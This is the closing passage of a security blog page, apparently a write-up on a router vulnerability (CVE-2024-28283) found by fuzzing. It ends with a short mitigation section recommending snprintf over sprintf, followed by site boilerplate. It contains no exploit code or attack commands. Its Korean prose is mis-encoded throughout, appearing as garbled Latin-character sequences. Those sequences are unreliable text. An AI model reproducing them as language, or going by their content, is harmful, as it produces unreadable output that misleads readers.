ë¼ìš°í„°ëŠ” ì‚¬ë‚´ì˜ ë‚´ë¶€ë§ ì •ë„ì—ì„œë§Œ ì‚¬ìš©í•  í™•ë¥ ì´ ë†’ìœ¼ë‚˜, ë§ë¶„ë¦¬ í™˜ê²½ì—ì„œë„ ì¹¨í•´ì‚¬ê³ ëŠ” ë°œìƒí•˜ê¸° ë•Œë¬¸ì— ì¹¨í•´ì‚¬ê³  ë°œìƒì‹œì˜ ìœ„í—˜ë„ë¥¼ í¬ê²Œ ë†’ì´ëŠ” ì·¨ì•½ì ìœ¼ë¡œ íŒë‹¨ëœë‹¤.</p> <p><br /></p> <h1 id="3-mitigation-ì œì‹œ">3. Mitigation ì œì‹œ</h1> <p>ì¼ì°¨ì ìœ¼ë¡œëŠ” íŒ¨í‚¹ì„ í•´ì•¼ í•˜ê¸´ í•˜ì§€ë§Œ, ì„ë² ë””ë“œ ë””ë°”ì´ìŠ¤ì˜ íŠ¹ì„±ìƒ ì»´í“¨íŒ… ë¦¬ì†ŒìŠ¤ì˜ í•œê³„ë¡œ ì¸í•´ ì‹¬ë³¼ì„ ë‚ ë¦¬ëŠ” ê²ƒ ì´ìƒì˜ íŒ¨í‚¹ì€ ì–´ë ¤ìš¸ ê²ƒìœ¼ë¡œ ë³´ì¸ë‹¤.</p> <p>ì¦‰ <code class="language-plaintext highlighter-rouge">sprintf</code>ë¥¼ <code class="language-plaintext highlighter-rouge">snprintf</code>ë¡œ ë³€ê²½í•´ì„œ ì˜¬ë°”ë¥¸ ë°ì´í„° í¬ê¸° ê´€ë¦¬ë¥¼ í•˜ëŠ” ê²ƒì´ í˜„ì¬ë¡œì„œëŠ” ê°€ì¥ ê·¼ë³¸ì ì¸ í•´ê²°ì±…ì´ë‹¤.</p> <br /><!-- Load Facebook SDK for JavaScript --> <div id="fb-root"></div> <script> (function(d, s, id) { var js, fjs = d.getElementsByTagName(s)[0]; if (d.getElementById(id)) return; js = d.createElement(s); js.id = id; js.src = "https://connect.facebook.net/en_US/sdk.js#xfbml=1&version=v3.0"; fjs.parentNode.insertBefore(js, fjs); })(document, "script", "facebook-jssdk"); </script> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8" ></script> <div class="share-page"> <p class="share-text">Share this on &rarr;</p> <a href="https://twitter.com/share?ref_src=twsrc%5Etfw" class="twitter-share-button" data-size="large" data-show-count="false" style="margin-top:5px;" >Tweet</a > <a class="fb-share-button" data-href="https://touBVa.github.io/blog/fuzzing/2025-01-27-CVE-2024-28283" data-size="large" data-layout="button" >Share</a> </div><!-- Author box --> <div class="card"> <div class="card-header"> About TouBVA </div> <div class="card-body"> <div class="row"> <div class="col-md-4"> <img class="author-profile-img" src="https://touBVa.github.io/assets/img/authors/toubva.jpeg" alt="TouBVA" /> </div> <div class="col-md-6"> <p class="author_bio">A Security Researcher, now concentrating on Security Consulting.</p> <p>Email : touBVa@gmail.com</p> <p>Website : https://toubva.github.io</p> <p class="profile-links"> <a class="social-link" href="https://github.com/TouBVa" target="_blank"><i class="fab fa-github fa-fw"></i></a> <a class="social-link" href="https://www.linkedin.com/in/johndoe" target="_blank"><i class="fab fa-linkedin fa-fw"></i></a> <a class="social-link" href="https://www.youtube.com/channel/UCSfLBFFfNU9r6ihfei6VeJw" target="_blank"><i class="fab fa-youtube fa-fw"></i></a> <a class="social-link" href="https://www.facebook.com/johndoe" target="_blank"><i class="fab fa-facebook fa-fw"></i></a> <a class="social-link" href="https://www.twitter.com/johndoe" target="_blank"><i class="fab fa-twitter fa-fw"></i></a> </p> </div> </div> </div> </div> </div><!-- Incomment incase you want to use Disqus <div id="disqus_thread"></div> --> </article> <div id="disqus_thread", style="width: 90%; margin-left: 5%;"><script> var disqus_config = function () { this.page.url = "https://touBVa.github.io/blog/fuzzing/2025-01-27-CVE-2024-28283"; /* Replace PAGE_URL with your page's canonical URL variable */ this.page.identifier = "/blog/fuzzing/CVE-2024-28283"; /* Replace PAGE_IDENTIFIER with your page's unique identifier variable */ }; (function () { /* DON'T EDIT BELOW THIS LINE */ var d = document, s = d.createElement('script'); s.src = 'https://toubva.disqus.com/embed.js'; s.setAttribute('data-timestamp', +new Date()); (d.head || d.body).appendChild(s); })(); </script> <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a> </noscript></div> </div> <div class="row"> <div class="col-md-4"> <div class="card"> <div class="card-header">About TouBVa</div> <div class="card-body"> <p class="author_bio">Welcome to my world!</p><!-- Place this tag where you want the github button to render. --> <a class="github-button" href="https://github.com/touBVa/touBVa.github.io" data-color-scheme="no-preference: dark; light: dark; dark: dark;" data-icon="octicon-star" data-size="large" data-show-count="true" aria-label="Star my blog on GitHub">Star</a> </div> </div> </div> <div class="col-md-4"> <div class="card"> <div class="card-header">Categories</div> <div class="card-body text-dark"> <div id="#dreamhack_system_hacking"></div> <li class="tag-head"> <a href="/blog/categories/dreamhack_system_hacking">dreamhack_system_hacking</a> </li> <a name="dreamhack_system_hacking"></a> <div id="#system_hacking"></div> <li class="tag-head"> <a href="/blog/categories/system_hacking">system_hacking</a> </li> <a name="system_hacking"></a> <div id="#protostar"></div> <li class="tag-head"> <a href="/blog/categories/protostar">protostar</a> </li> <a name="protostar"></a> <div id="#certification_study"></div> <li class="tag-head"> <a href="/blog/categories/certification_study">certification_study</a> </li> <a name="certification_study"></a> <div id="#paper_study"></div> <li class="tag-head"> <a href="/blog/categories/paper_study">paper_study</a> </li> <a name="paper_study"></a> <div id="#network_hacking"></div> <li class="tag-head"> <a href="/blog/categories/network_hacking">network_hacking</a> </li> <a name="network_hacking"></a> <div id="#blockchain"></div> <li class="tag-head"> <a href="/blog/categories/blockchain">blockchain</a> </li> <a name="blockchain"></a> <div id="#reversing"></div> <li class="tag-head"> <a href="/blog/categories/reversing">reversing</a> </li> <a name="reversing"></a> <div id="#my_life"></div> <li class="tag-head"> <a href="/blog/categories/my_life">my_life</a> </li> <a name="my_life"></a> <div id="#web_hacking"></div> <li class="tag-head"> <a href="/blog/categories/web_hacking">web_hacking</a> </li> <a name="web_hacking"></a> <div id="#fuzzing"></div> <li class="tag-head"> <a href="/blog/categories/fuzzing">fuzzing</a> </li> <a name="fuzzing"></a> <div id="#forensic"></div> <li class="tag-head"> <a href="/blog/categories/forensic">forensic</a> </li> <a name="forensic"></a> </div> </div> </div> <div class="col-md-4"> <div class="card"> <div class="card-header">Useful Links</div> <div class="card-body text-dark"> <li> <a href="https://touBVa.github.io/">Home</a> </li> <li> <a href="https://touBVa.github.io/about">About</a> </li> <li> <a href="https://touBVa.github.io/blog">Blog</a> </li> <li> <a href="https://touBVa.github.io/contact">Contact</a> </li> </div> </div> </div> </div> </div> </div> <div class="col-lg-12" id="newsletter_footer"><!-- Mailchimp Newletters --> <form action=""method="post" id="mc-embedded-subscribe-form" name="mc-embedded-subscribe-form" class="validate" target="_blank" novalidate> <div id="mc_embed_signup_scroll_footer"> <label for="mce-EMAIL_footer"> Signup for Weekly Email Newsletters :D</label> <input type="email" value="" name="EMAIL" class="email" id="mce-EMAIL_footer" placeholder="email address" required> <!-- real people should not fill this in and expect good things - do not remove this or risk form bot signups--> <div style="position: absolute; left: -5000px;" aria-hidden="true"> <input type="text" name="b_50bab1c85eae24ecfb0f68361_3a2dd721d0" tabindex="-1" value=""> </div><br /> <div class="clear"> <input type="submit" value="Subscribe" name="subscribe" id="mc-embedded-subscribe_footer" class="btn btn-lg btn-success"> </div> </div> </div><footer> <p> Powered by<a href="https://github.com/touBVa"> TouBVa</a>. Hosted at <a href="https://pages.github.com">Github</a>. Subscribe via <a href=" /feed.xml ">RSS</a> </p> </footer> <script> var options = { classname: 'progressline', id: 'my-id' }; var nanobar = new Nanobar( options ); nanobar.go( 30 ); nanobar.go( 76 ); nanobar.go(100); </script> <div hidden id="snipcart" data-api-key="Y2I1NTAyNWYtMTNkMy00ODg0LWE4NDItNTZhYzUxNzJkZTI5NjM3MDI4NTUzNzYyMjQ4NzU0"></div> <script src="https://cdn.snipcart.com/themes/v3.0.0-beta.3/default/snipcart.js" defer></script> <script src="https://touBVa.github.io/assets/js/mode-switcher.js"></script> <!-- <script> if (window.netlifyIdentity) { window.netlifyIdentity.on("init", user => { if (!user) { window.netlifyIdentity.on("login", () => { document.location.href = "/admin/"; }); } }); } </script> --> </body> </html>
